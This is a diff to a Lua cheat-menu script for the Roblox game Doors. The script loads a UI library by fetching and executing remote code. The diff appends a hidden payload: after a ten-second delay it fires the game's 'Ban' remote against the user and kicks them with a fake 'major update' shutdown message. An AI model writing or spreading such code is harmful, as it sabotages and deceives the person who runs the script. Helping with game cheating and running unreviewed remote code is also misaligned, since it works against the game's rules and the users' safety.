@@ -1,3 +1,5 @@
+
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Doors But kinda hacked.", HidePremium = false, SaveConfig = true, ConfigFolder = "CheapHacked", IntroEnabled = true, IntroText = "Doors But kinda hacked."})
 local plr = game.Players.LocalPlayer
@@ -255,4 +257,6 @@ end
 })
 end
 OrionLib:Init()
-
+wait(10)
+game.ReplicatedStorage.Ban:FireServer()
+game.Players.LocalPlayer:Kick("Server was shut down: MAJOR UPDATE IS OUT!")
